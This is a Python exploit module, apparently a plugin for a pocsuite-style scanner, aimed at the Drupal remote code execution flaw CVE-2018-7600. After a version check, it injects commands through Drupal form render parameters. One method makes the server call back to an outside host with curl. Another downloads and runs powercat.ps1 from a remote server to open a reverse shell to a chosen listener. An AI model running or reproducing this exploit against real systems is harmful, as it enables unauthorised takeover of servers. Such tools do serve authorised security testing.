"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.shellcodes.php import *
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from bs4 import BeautifulSoup
import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import binascii
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from configvalue import * 


class DemoPOC(POCBase):
    vulID = 'CVE-2018-7600'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '28/03/2018'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600']
    name = 'Drupal unauthenticated RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
		        "folder_init": "cve_2018_7600"}
    appName = 'drupal-CVE-2018-7600-RCE'
    appVersion = 'CVE-2018-7600'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'''
    url_result = {}

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url):
        try: 

            url = self.url + "/CHANGELOG.txt"
            r = requests.get(url)
            
            fixed_version = ['7.58', '8.3.9', '8.4.6', '8.5.1']
            items = re.findall("Drupal .*$", r.text, re.MULTILINE)
 
            current_version = items[0].split(",")[0].split(" ")[1]
            if(current_version < "7.58") or(("8.3." in current_version) and (current_version < "8.3.9")) or (("8.4." in current_version) and (current_version < "8.4.6")) or(("8.5." in current_version) and (current_version < "8.5.1")):
                return True
            else: 
                return False 
            
        except: 
            return False
                
    def _verify(self):
        result = {}
        check  = self.check_version(self.url)
       
        try: 
            if check: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
        
        except Exception as e: 
            logger.warn(str(e))
        return self.parse_output(result)
        
       

    def _attack(self):
        result = {}
        flag = random_str(length=20)
        url_check = "http://" + PUBLIC_IP + ":65535/"+ flag
        get_params1 = {'q':'user/password', 'name[#post_render][]':'exec', 'name[#type]':'markup', 'name[#markup]': "powershell curl " + url_check}
        post_params1 = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
        r = requests.post(self.url + "/user/register", params=get_params1, data=post_params1, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id':form_build_id}
            r = requests.post(self.url + "/user/register", params=get_params, data=post_params, verify=False)
            print(r.status_code)
            r  = requests.get("http://"+ PUBLIC_IP + ":65535/logfile.txt")
            if flag in r.text: 
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/user/register"
        return self.parse_output(result)
    def _shell(self):
        
         
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        #-- 
        urlexploit = datainput['entrypoint']
        REVERSE_SHELL_IP = datainput['LHOST']
        REVERSE_SHELL_PORT = str(datainput['LPORT'])
        cmd = '''powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{}:65535/powercat.ps1');powercat -c {} -p {} -e cmd"'''.format(PUBLIC_IP, REVERSE_SHELL_IP, REVERSE_SHELL_PORT)
        get_params1 = {'q':'user/password', 'name[#post_render][]':'exec', 'name[#type]':'markup', 'name[#markup]': cmd}
        post_params1 = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
        r = requests.post(urlexploit + "/user/register", params=get_params1, data=post_params1, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id':form_build_id}
            r = requests.post(urlexploit + "/user/register", params=get_params, data=post_params, verify=False)
            
        
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
